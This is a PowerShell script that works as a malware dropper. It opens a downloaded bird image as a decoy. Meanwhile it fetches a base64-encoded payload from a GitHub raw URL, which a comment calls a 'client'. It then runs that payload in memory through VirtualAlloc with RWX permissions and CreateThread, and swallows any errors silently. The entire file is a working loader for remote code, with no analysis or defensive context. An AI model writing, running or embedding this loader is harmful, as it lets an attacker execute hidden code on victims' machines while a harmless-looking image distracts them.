try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
    
    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"
    
    # Download the encoded.txt file (base64 encoded client)
    $encodedUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/encoded.txt"
    $base64Content = (Invoke-WebRequest -Uri $encodedUrl).Content
    
    # Decode the base64 content
    $bytes = [System.Convert]::FromBase64String($base64Content)
    
    # Create a new runspace to execute the binary
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    
    public class InMemoryExecution {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
"@
    
    # Allocate memory with read, write, execute permissions
    $memAddr = [InMemoryExecution]::VirtualAlloc([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
    
    # Copy the bytes to the allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $memAddr, $bytes.Length)
    
    # Create a thread that starts at the memory location
    $threadHandle = [InMemoryExecution]::CreateThread([IntPtr]::Zero, 0, $memAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    # Wait for execution to complete (can be adjusted or removed depending on needs)
    [void][InMemoryExecution]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
} catch {
    # Write-Host "An error occurred: $_"

    # Show error message box
    # Add-Type -AssemblyName PresentationFramework
    # [System.Windows.MessageBox]::Show("An error occurred: $_", "Error", "OK", "Error")
}